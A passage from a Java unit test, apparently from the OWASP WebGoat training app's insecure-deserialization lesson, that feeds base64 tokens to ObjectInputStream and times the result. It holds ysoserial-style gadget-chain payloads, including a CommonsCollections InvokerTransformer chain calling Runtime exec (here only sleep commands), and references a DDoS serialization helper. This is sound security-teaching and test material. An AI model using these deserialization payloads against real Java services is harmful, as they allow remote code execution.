nVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwALAAtCgArAC4BABNUaHJlYWQuc2xlZXAoNTAwMCk7CAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyMjM2MTU0OTM5ODEyNTA2AQAgTHlzb3NlcmlhbC9Qd25lcjIzNjE1NDkzOTgxMjUwNjsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA-nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB-ACwAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ-AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAOwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHEAfgAFc3EAfgACcQB-ABFxAH4AKXEAfgAweA";
			//test(token);
			/* 5.0.7.Final incompatible: stream classdesc 
			 * serialVersionUID = -428752683973550783, 
			 * local class serialVersionUID = -8699352886133051976 
			 * 
			 */
			
			/* CommonsCollections ClassNotFound */
			// token =
			// "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB-AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB-ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB-ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5-kde0cCAAB4cAAAAAF0ABJUaHJlYWQuc2xlZXAoNTAwKTt0AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA";
			//test(token);

			DummySerializable someObject = new DummySerializable("test", 20);
			token = SerializationHelper.toString((Serializable) someObject);
			token = "rO0ABXNyACpvcmcub3dhc3Aud2ViZ29hdC5wbHVnaW4uRHVtbXlTZXJpYWxpemFibGX5gdafMPTHCwIAAkkAA2FnZUwABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cAAAABR0AAR0ZXN0";
			Object myObject = SerializationHelper.fromString(token);
			long serialVersionUID = ObjectStreamClass.lookup(myObject.getClass()).getSerialVersionUID();
			assertEquals("rO0ABXNyACpvcmcub3dhc3Aud2ViZ29hdC5wbHVnaW4uRHVtbXlTZXJpYWxpemFibGX5gdafMPTHCwIAAkkAA2FnZUwABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cAAAABR0AAR0ZXN0", token);
			//assertEquals("-467856907060328693", ""+serialVersionUID);
			test(token);

			token = SerializationHelper.toString((Serializable) SerializationHelper.getDdosSerialization());
			// SerializationHelper.fromString(token);
			// test(token);

		} catch (Exception e) {
			e.printStackTrace();
			fail();
		}
	}

	public static void test(String token) throws Exception {
		String b64token;
		byte[] data;
		ObjectInputStream ois;
		Object o;
		long before, after;
		int delay;

		b64token = token.replace('-', '+').replace('_', '/');
		try {
			data = Base64.getDecoder().decode(b64token);
			ois = new ObjectInputStream(new ByteArrayInputStream(data));

			before = System.currentTimeMillis();
			try {
				o = ois.readObject();
			} catch (Exception e) {
				e.printStackTrace();
				o = null;
			}
			after = System.currentTimeMillis();
			ois.close();

			delay = (int) (after - before);
			if (delay > 7000) {
				fail("fail took too long: " + delay);
			} else if (delay < 3000) {
				fail("fail too fast: " + delay);
			} else {
				System.out.print("success" + delay);
			}
		} catch (Exception e) {
			fail("fail other: " + e.getMessage());
		}
	}
	
}